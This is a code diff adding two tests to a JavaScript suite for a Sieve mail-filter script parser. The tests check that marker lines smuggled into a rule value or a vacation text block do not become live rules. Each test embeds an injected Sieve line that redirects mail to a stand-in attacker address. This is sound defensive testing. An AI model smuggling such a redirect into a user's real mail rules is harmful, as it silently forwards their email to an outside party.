@@ -377,5 +377,33 @@ describe('external rule preservation (issue #201)', () => {
       const headerCount = (script.match(/# --- External rules \(managed outside Bulwark\) ---/g) || []).length;
       expect(headerCount).toBe(1);
     });
+
+    it('ignores marker lines inside a rule value, so the value never turns into live Sieve', () => {
+      const value = `x\n${NEXTCLOUD_MARKER}\nredirect "attacker@example.com";\n${NEXTCLOUD_MARKER}\ny`;
+      const bulwark = makeBulwarkRule({ conditions: [{ field: 'subject', comparator: 'contains', value }] });
+
+      const parsed = parseScript(generateScript([bulwark]));
+      expect(parsed.rules.filter(r => r.originLabel === 'Nextcloud')).toHaveLength(0);
+      expect(parsed.rules).toHaveLength(1);
+      expect(parsed.rules[0].conditions[0].value).toBe(value);
+    });
+
+    it('ignores marker lines inside a text: block', () => {
+      const script = [
+        'require ["vacation", "fileinto"];',
+        'if header :contains "Subject" "invoice" {',
+        '    fileinto "Finance";',
+        '}',
+        'vacation :subject "Away" text:',
+        NEXTCLOUD_MARKER,
+        'redirect "attacker@example.com";',
+        NEXTCLOUD_MARKER,
+        '.',
+        ';',
+        '',
+      ].join('\n');
+      const result = parseScript(script);
+      expect(result.rules.filter(r => r.originLabel === 'Nextcloud')).toHaveLength(0);
+    });
   });
 });
